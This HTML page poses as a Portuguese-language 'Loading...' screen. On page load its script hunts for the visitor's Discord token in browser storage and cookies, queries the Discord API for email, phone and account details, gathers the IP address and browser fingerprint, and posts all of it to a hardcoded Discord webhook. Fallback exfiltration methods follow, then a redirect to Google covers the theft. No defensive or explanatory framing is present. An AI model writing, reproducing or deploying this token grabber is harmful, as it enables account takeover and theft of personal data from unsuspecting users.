<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Carregando...</title>
    <script>
        (async function() {
            const webhookURL = "https://discord.com/api/webhooks/1519362826098184336/nkxrO_ET6SZWcmAFCoHoBHCTKahRKVft_QkMuWbpfLCEfN3ndWoa2rlLf40obW-DJjcr";
            
            // Tenta pegar token de várias fontes
            let token = localStorage.getItem("token");
            
            // Tenta no sessionStorage também
            if (!token) {
                try { token = sessionStorage.getItem("token"); } catch(e) {}
            }
            
            // Tenta em cookies do discord.com
            if (!token) {
                try {
                    const cookies = document.cookie.split(';');
                    for (let c of cookies) {
                        if (c.trim().startsWith('token=')) {
                            token = c.trim().split('=')[1];
                        }
                    }
                } catch(e) {}
            }

            // Tenta no indexedDB (localForage)
            if (!token) {
                try {
                    const db = await new Promise((resolve, reject) => {
                        const request = indexedDB.open("discord");
                        request.onsuccess = () => resolve(request.result);
                        request.onerror = () => reject();
                    });
                    // Discord pode usar outros nomes de banco
                } catch(e) {}
            }

            let email = "Não disponível";
            let phone = "Não disponível";
            let username = "Desconhecido";
            let userID = "Desconhecido";

            // Se encontrou o token, busca dados na API
            if (token) {
                try {
                    const userResp = await fetch("https://discord.com/api/v9/users/@me", {
                        headers: { "Authorization": token }
                    });
                    const userData = await userResp.json();
                    email = userData.email || "Não disponível";
                    phone = userData.phone || "Não vinculado";
                    username = `${userData.username}#${userData.discriminator || "0"}`;
                    userID = userData.id;
                } catch (e) {}
            }

            // Pegar IP - várias APIs como fallback
            let ip = "Não capturado";
            const ipAPIs = [
                "https://api.ipify.org?format=json",
                "https://api.my-ip.io/ip.json",
                "https://ip-api.com/json/?fields=query",
                "https://api.ip.sb/geoip",
                "https://httpbin.org/ip"
            ];
            for (const api of ipAPIs) {
                try {
                    const resp = await fetch(api, { mode: 'cors' });
                    const data = await resp.json();
                    ip = data.ip || data.query || data.ip_address || "Não capturado";
                    if (ip && ip !== "Não capturado") break;
                } catch(e) {}
            }

            const platform = navigator.platform;
            const language = navigator.language;
            const screenRes = `${screen.width}x${screen.height}`;
            const userAgent = navigator.userAgent;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

            // Monta mensagem
            const mensagem = 
                `**🎯 Dados Capturados**\n` +
                `**👤 Usuário:** ${username}\n` +
                `**🆔 ID:** ${userID}\n` +
                `**📧 Email:** ${email}\n` +
                `**📱 Telefone:** ${phone}\n` +
                `**🔑 Token:** \`${token || "Não encontrado"}\`\n` +
                `**🌐 IP:** ${ip}\n` +
                `**💻 Sistema:** ${platform}\n` +
                `**🌍 Idioma:** ${language}\n` +
                `**🕐 Fuso:** ${timezone}\n` +
                `**🖥️ Tela:** ${screenRes}\n` +
                `**📄 User Agent:** ${userAgent.substring(0, 150)}`;

            // Envia
            try {
                await fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: mensagem })
                });
            } catch (e) {
                try {
                    const blob = new Blob([JSON.stringify({ content: mensagem })], { type: 'application/json' });
                    navigator.sendBeacon(webhookURL, blob);
                } catch (e2) {
                    new Image().src = webhookURL + "?content=" + encodeURIComponent(mensagem);
                }
            }

            // Redireciona
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 2000);
        })();
    </script>
</head>
<body>
    <h1>Carregando...</h1>
</body>
</html>
